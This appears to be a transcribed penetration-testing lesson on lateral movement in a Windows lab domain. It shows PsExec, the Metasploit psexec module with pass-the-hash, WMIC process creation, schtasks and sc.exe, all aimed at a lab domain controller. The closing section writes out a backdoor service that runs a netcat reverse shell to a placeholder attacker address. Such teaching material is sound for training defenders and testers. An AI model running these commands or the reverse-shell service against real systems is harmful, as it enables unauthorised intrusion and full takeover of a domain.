### **[Section 1: Introduction to Remote Command Execution & Threat Scenarios]**

Hello friends. Up to this point, I have explained how you can enumerate a remote victim system once you gain shell access to extract sensitive credentials, private keys, configuration files, and other critical information. There are numerous ways to extract intelligence.

Consider a specific scenario: suppose you have obtained the remote credentials of a user on a target network, or in this case, administrative credentials within a Windows Active Directory domain environment. Now, what can you do with them? You possess credentials and need to gain shell access on a remote system where you do not currently have an active interactive shell. You can log in and establish shell access, but what methods and tools can you use to execute commands on that remote system? It could be any command inside any shell running on the target machine, assuming you obtained admin credentials or credentials belonging to an account that is part of the administrative group in that domain.

---

### **[Section 2: SMB Protocol Mechanics & Administrative Network Shares]**

In Windows environments, Microsoft developed **Server Message Block (SMB)** as the primary protocol for remote access, file sharing, and remote management. If you have network SMB access to the remote system and possess valid credentials to authenticate, you can execute remote commands across the network.

In Windows Server environments, administrative shares are exposed over SMB that must be open for remote execution—specifically the **`ADMIN$`** share and administrative drive shares like **`C$`**. If those administrative shares are accessible, you can connect to them, stage files or modifications, and leverage internal utilities to execute commands remotely.

---

### **[Section 3: Lateral Movement Scenarios & Common Utility Tooling]**

A second common scenario involves **lateral movement**. Suppose you have already obtained an initial shell on a compromised victim host inside the target network. To compromise a third machine located deeper in the environment, you must move laterally because both machines reside on the same internal network segment. Lateral movement refers to moving from one compromised system to another on the same network.

To obtain a shell on that target, you can use remote command execution techniques. From your existing victim shell, you can specify the target machine's IP address, supply the harvested credentials, authenticate to the target, and compromise it to pop an interactive shell.

Windows provides several administrative utilities to accomplish this. The two most commonly used tools are **PsExec** and **WMIC** (Windows Management Instrumentation Command-line). First, we will examine PsExec. I have not prepared slides or written notes here; I will explain the mechanics verbally.

---

### **[Section 4: Sysinternals PsExec Overview, Packaging, & Antivirus Considerations]**

**PsExec** is a free utility from the **Microsoft Sysinternals** suite that also comes built into penetration testing frameworks like Metasploit. Despite the "PS" prefix, it is not PowerShell; it is a standalone command-line executable that does not come pre-installed in standard Windows builds and must be downloaded separately.

If you plan to use PsExec from a target system, downloading external binaries can be risky because antivirus and EDR solutions often flag the **PSTools** suite. Furthermore, enterprise environments may restrict installing or running unauthorized third-party binaries. In those situations, utilizing Metasploit is advantageous because the functionality is built directly into the framework. We will demonstrate both approaches: executing standalone PsExec on Windows and utilizing Metasploit from Kali Linux.

### **[Section 6: Sysinternals PsExec Mechanics vs. Telnet]**

Microsoft created PsExec as a modern Windows replacement for legacy protocols like **Telnet**. With Telnet, remote command execution requires enabling the Telnet service and installing the Telnet client software on the target system.

To eliminate the need for client installations and complex remote service configurations, Microsoft engineered PsExec. PsExec requires **no client software pre-installed on the target system**. You only need the standalone `psexec.exe` binary on the attacking machine, which can be downloaded directly from the official Microsoft Sysinternals website as part of PSTools.

---

### **[Section 7: Technical Prerequisites & Execution Conditions]**

For PsExec to execute successfully, several strict conditions must be satisfied:

1. **Administrative Credentials**: You must possess a valid username and password belonging to an administrative account on the remote host.
2. **SMB Access**: SMB connectivity (port 445) must be reachable on the target system.
3. **Accessible `ADMIN$` Share**: The administrative share **`ADMIN$`** must be enabled and accessible over SMB.
4. **Remote Management Enabled**: Windows Server remote management must be active, and host firewalls must allow inbound SMB traffic.

If any of these conditions are missing, PsExec will fail with access denied or connection errors. Commands execute under the exact privilege level of the administrative account supplied.

---

### **[Section 8: Windows PsExec CLI Syntax, Troubleshooting, & Version Quirks]**

The standard execution syntax for PsExec is:

```
psexec \\<TARGET_IP> -u <USERNAME> -p <PASSWORD> <COMMAND>
```

Testing against the Domain Controller (`192.168.164.131`) using Bob's credentials:

```
psexec \\192.168.164.131 -u Bob -p 123 ipconfig
```

**Troubleshooting Observations**:

- When executing native Sysinternals PsExec locally on Windows, the execution speed is noticeably slow as it connects and initializes the remote `PSEXESVC` service.
- If you receive the error `The user has not been granted the requested logon type at this computer`, verify version-specific quirks. In PsExec version 2.2, a known bug frequently caused "Access Denied" errors even with valid credentials.
- In version 2.30 and above, you must supply the **`-i`** switch (interactive mode) to allow the command to execute and return properly.
- **The `-d` Switch (Detached Mode)**: Adding `-d` executes the command in the background without waiting for the process to terminate, suppressing console output. By default, omitting `-d` channelizes standard input/output so that the command output streams directly into your active terminal.

Adding the **`-i`** switch successfully executes the remote command and displays the Domain Controller's IP configuration inline. Through this mechanism, an attacker can launch arbitrary binaries, execute backdoors, establish reverse listeners, or stage persistence.

### **[Section 9: Executing PsExec via Metasploit & Pass-the-Hash Integration]**

Switching to Kali Linux, we execute the same attack using Metasploit's implementation. In Metasploit, PsExec is cataloged under the module **`exploit/windows/smb/psexec`**. While cataloged as an exploit, PsExec is technically an abuse of legitimate administrative functionality rather than a software vulnerability.

**Configuring the Metasploit Module**:

```
use exploit/windows/smb/psexec
set RHOSTS 192.168.164.131
set SMBUser Bob
set SMBPass 123
```

**Pass-the-Hash Capability**: A major operational advantage of Metasploit's PsExec module is that the `SMBPass` parameter accepts either a plaintext password or an **NTLM password hash**. If an administrative NT hash was harvested from memory or dumped from a database, it can be passed directly without cracking it offline, initiating a **Pass-the-Hash** attack.

Executing the module opens a Meterpreter session almost instantaneously, demonstrating far greater speed than native Windows PsExec. Inspecting the session with `sysinfo` confirms connection to `TechHackerDC`. Dropping to a Windows shell and executing `whoami` returns **`NT AUTHORITY\SYSTEM`**, providing the highest possible administrative authority on the Domain Controller.

### **[Section 10: Remote Command Execution via WMIC]**

Another native administrative utility is **WMIC (Windows Management Instrumentation Command-line)**. Unlike PsExec, WMIC comes **pre-installed by default across Windows operating systems** from Windows XP Professional through Windows 10. Because it is built-in, no external binaries need to be uploaded to the target.

WMIC interacts with the WMI repository to provide granular administrative control over local and remote systems. It relies on the same fundamental prerequisites: remote network reachability and administrative credentials.

**WMIC Command Syntax**:

```
wmic /node:<TARGET_IP> /user:<USERNAME> /password:<PASSWORD> process call create "<COMMAND>"
```

Executing against the Domain Controller:

```
wmic /node:192.168.164.131 /user:Bob /password:123 process call create "ipconfig"
```

**Detached Execution Behavior**: Unlike PsExec, WMIC spawns the specified command inside an independent, detached process. It does not display standard output inline in your terminal; instead, it returns an execution status code and the created **Process ID (PID)**. Commands that terminate immediately (like `ipconfig`) exit as soon as execution completes.

To verify persistence, we spawn a persistent process such as `cmd.exe`, which returns `ProcessId = 5028`. Querying running processes via:

```
wmic /node:192.168.164.131 /user:Bob /password:123 process list brief
```

confirms that PID 5028 (`cmd.exe`) is actively executing in the background on the Domain Controller.

**Multi-Host Execution**: WMIC also supports targeting multiple machines simultaneously by supplying a text file containing target IP addresses: `/node:@"hosts.txt"`. Additionally, running processes can be terminated remotely using `process where ProcessId=<PID> delete`.

### **[Section 11: Alternative Native Execution Vectors (`schtasks` & `sc.exe`)]**

Beyond PsExec and WMIC, Windows provides additional built-in administrative mechanisms for remote command execution:

#### **1. Scheduled Tasks (`schtasks`)**

While the legacy `at` command has been deprecated in modern Windows, `schtasks` remains fully supported. It allows scheduling commands, scripts, or payloads to run at specific times or recurring intervals on remote systems:

```
schtasks /s <TARGET_IP> /u <USERNAME> /p <PASSWORD> /create /tn <TASK_NAME> /tr <BINARY_PATH> /sc <SCHEDULE> /st <START_TIME>
```

#### **2. Service Control Manager (`sc.exe`)**

Attackers can create and start custom Windows services on remote machines:

1. Establish an authenticated network session using `net use`:
    
    ```
    net use \\<TARGET_IP> /user:<USERNAME> <PASSWORD>
    ```
    
2. Query existing services using `sc \\<TARGET_IP> query`.
3. Create a new service pointing to an executable or command payload (noting the required space after `binPath=`):
    
    ```
    sc \\<TARGET_IP> create BackdoorService binPath= "cmd.exe /c C:\nc.exe -e cmd.exe <ATTACKER_IP> <PORT>"
    ```
    
4. Start the service remotely to execute the payload under `SYSTEM` context:
    
    ```
    sc \\<TARGET_IP> start BackdoorService
    ```
